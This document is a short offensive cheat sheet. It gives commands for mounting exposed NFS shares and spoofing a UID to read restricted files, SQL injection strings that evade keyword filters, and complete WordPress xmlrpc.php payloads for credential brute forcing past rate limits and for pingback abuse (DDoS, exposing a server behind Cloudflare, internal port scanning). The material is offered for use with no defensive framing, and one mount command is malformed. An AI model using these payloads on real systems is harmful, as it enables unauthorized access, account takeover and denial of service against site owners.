			##--- NFS EXPLOITATION ---##
# showmount -e $IP // Which folder has the server available to mount
# scanner/nfs/nfsmount // Metasploit module -- Scans NFS mounts and list permissions

# mount -t $IP:<folder_to_mount> <local_file> // Mount the available folder

If you mount a folder which contains files or folders only accesible by some user (by UID).
You can create locally a user with that UID and using that user you will be able to access the file/folder.


			##--- SQLi CHARACTER BYPASS ---##
#For filters that filter specific commands of the SQL like "SELECT", "TRUE", "FALSE", "--","OR",
#"=", ",", "AND", "NOT"

Instead of: 'or 1=1 # 
enter: '|| 1=1 # or ' OORR 1=1#

			##--- XMLRPC.PHP EXPLOITATION ---##
# xmlrpc.php can be left exposed for a big number of Wordpress sites.

# If it's left exposed use this to list all commands
# 
# <?xml version="1.0" encoding="utf-8"?> 
# <methodCall> 
# <methodName>system.listMethods</methodName> 
# <params></params> 
# </methodCall>

2 types of attacks can be carried out if its not properly configured.

1. Username brute force attack
Using a method wp.GetUsersBlogs;
# <?xml version="1.0" encoding="UTF-8"?>
# <methodCall> 
# <methodName>wp.getUsersBlogs</methodName> 
# <params> 
# <param><value>USERNAME</value></param> 
# <param><value>PASSWORD</value></param> 
# </params> 
# </methodCall>
This type of brute force attack can bypass rate limits and blocked logins.

2. Xmlrpc.php pingback attacks
Using the pingback.ping method an attacker could execute a distributed
denial of service (DDOS) attack, bypass cloudflare protection and execute
a request to see the public IP of the server or a Cross Site Port Attack (XSPA),
where an attacker can execute the method from a single Wordpress installation to
to the same host (or internal host) and scan the ports. An open port can be determined
by observing the difference in time of the response or by looking at the response. (Any number higher than 0 means open)
# <?xml version="1.0" encoding="UTF-8"?>
# <methodCall>
# <methodName>pingback.ping</methodName>
# <params>
# <param>
# <value><string>https://postb.in/1562017983221-4377199190203</string></value>
# </param>
# <param>
# <value><string>https://example.com/blog-post</string></value>
# </param>
# </params>
# </methodCall>
If the response returns a 0 for almost any request, it usually means it's configured properly.
